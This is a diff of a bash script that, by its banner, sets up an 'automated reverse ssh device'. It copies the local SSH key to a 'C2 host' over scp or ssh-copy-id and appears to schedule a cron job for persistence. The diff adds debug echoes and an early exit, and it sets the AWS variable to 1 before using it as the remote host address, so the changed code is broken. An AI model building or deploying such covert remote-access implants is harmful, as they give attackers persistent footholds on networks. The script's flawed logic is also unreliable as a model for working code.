@@ -1,5 +1,3 @@
-#!/bin/bash
-
 ################################################################
 #                                                              #
 # Let's setup an automated reverse ssh device!                 #
@@ -10,6 +8,8 @@
 # xoxo Hexadecim8 did this xoxo                                #
 #                                                              #
 ################################################################
+
+set -e
 
 bold=$(tput bold)
 normal=$(tput sgr0)
@@ -43,7 +43,7 @@ while getopts "a:k:s:n:c:u:l:h" FLAG
 do
 	case $FLAG in
 		a)
-			AWS=$OPTARG
+			AWS=1
 			;;
 		k)
 			KEYNAME=$OPTARG
@@ -126,15 +126,17 @@ done
 #                                                      #
 ########################################################
 
-if [ -a ${AWS+x}]; then
-#ssh -i ${KEYNAME} ${USERC2}@${AWS}
+if [ ${AWS} -eq 1 ]; then
 
+    echo "I got here"
+    #ssh -i ${KEYNAME} ${USERC2}@${AWS}
 # Transferring local key to C2
     echo "${bold}### Copying key to C2 host ###"
-    scp ~/.ssh/id_rsa.pub -i ${KEY} ${USERC2}@{AWS}:/home/${USERC2}/.ssh/
+    scp -i ${KEY} /home/${USERLOCAL}/.ssh/id_rsa.pub ${USERC2}@${AWS}:/home/${USERC2}/.ssh/
     printf "\n"
+    echo "I got here."
+    exit
 else
-
 # Transferring local key to C2
     echo "${bold}### Copying key to C2 host ###"
     ssh-copy-id $HOST
@@ -161,7 +163,7 @@ else
     rm cronsh
     printf "\n"
 
-        exit
+    exit
 fi
 
 # Finishing script
